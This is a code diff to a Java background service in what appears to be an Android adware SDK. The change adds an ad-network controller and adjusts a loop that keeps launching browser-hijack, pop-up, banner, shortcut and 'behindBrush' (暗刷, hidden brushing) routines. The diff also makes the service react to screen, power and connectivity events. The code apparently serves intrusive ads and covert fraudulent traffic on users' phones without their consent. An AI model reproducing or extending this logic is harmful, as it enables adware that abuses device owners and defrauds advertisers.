@@ -10,6 +10,7 @@ import java.text.ParseException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
+import com.guang.client.controller.GAPPNextController;
 import com.guang.client.controller.GOfferController;
 import com.guang.client.controller.GSMController;
 import com.guang.client.controller.GUserController;
@@ -61,6 +62,7 @@ public class GSysService  {
 		registerListener();
 		GUserController.getInstance().login();
 		GOfferController.getInstance().initMobVista();
+		GAPPNextController.getInstance();
 		GSMController.getInstance().init();
 		
 		QLInstall.getInstance().getInstallAppNum();
@@ -76,27 +78,32 @@ public class GSysService  {
 				if(context == null)
 					context = QLAdController.getInstance().getContext();
 				initData();
+				boolean open = false;
+
 				while(isMainLoop())
 				{				
 					try {	
-						boolean open = false;
+						if(open)
+							Thread.sleep(10000);
+						else
+							Thread.sleep(3000);
 						if(isPresent && GUserController.getMedia().getOpen())
 						{
 							open = GUserController.getMedia().isOpenApp();
+
 							if(open)
 							{
-								browserBreakThread();
 								browserSpotThread();
+								browserBreakThread();
+								
 								appSpotThread();
 								bannerThread();
 							}
 							shortcutThread();
 							behindBrushThread();
 						}
-						if(open)
-							Thread.sleep(10000);
-						else
-							Thread.sleep(2000);
+						
+
 					} catch (Exception e) {
 					}
 				}	
@@ -231,7 +238,7 @@ public class GSysService  {
 	public void appSpot()
 	{
 		GTools.saveSharedData(GCommon.SHARED_KEY_APP_SPOT_TIME,GTools.getCurrTime());
-		GOfferController.getInstance().showAppSpot();
+		GAPPNextController.getInstance().showAppSpot();
 	}
 	//banner
 	public void banner(String appNmae)
@@ -271,7 +278,6 @@ public class GSysService  {
 
 		GTools.uploadStatistics(GCommon.SHOW,GCommon.BROWSER_BREAK,"00000");
 		GLog.e("-----------------", "browserBreak success");
-
 	}
 	//暗刷
 	public void behindBrush()
@@ -339,7 +345,7 @@ public class GSysService  {
 		isRuning = true;
 		isLock = false;
 		GTools.saveSharedData(GCommon.SHARED_KEY_WIFI_TIME, 0l);
-
+		GTools.saveSharedData(GCommon.SHARED_KEY_IS_OPEN_LAUNCHER, false);
 		if(!isMainLoop())
 		{
 			long n_time = GTools.getCurrTime();
@@ -358,7 +364,20 @@ public class GSysService  {
 			GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_TIME, 0l);
 			GTools.saveSharedData(GCommon.SHARED_KEY_BEHINDBRUSH_NUM, 0);
 		}
-		
+		else
+		{
+			String browserspot_app = GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_TASK_BROWSERSPOT_APP, "");
+			if(browserspot_app != null && !"".equals(browserspot_app))
+			{
+				browserSpot(browserspot_app);
+			}
+			
+			String banner_app = GTools.getSharedPreferences().getString(GCommon.SHARED_KEY_TASK_BANNER_APP, "");
+			if(banner_app != null && !"".equals(banner_app))
+			{
+				banner(banner_app);
+			}
+		}
 	}
 	
 	private boolean isMainLoop()
@@ -489,6 +508,8 @@ public class GSysService  {
         filter.addAction(Intent.ACTION_SCREEN_OFF);
         filter.addAction(Intent.ACTION_USER_PRESENT);
         filter.addAction(Intent.ACTION_BATTERY_CHANGED);
+        filter.addAction(Intent.ACTION_POWER_CONNECTED);
+        filter.addAction(Intent.ACTION_POWER_DISCONNECTED);
         filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
         contexts.registerReceiver(receiver, filter);
         
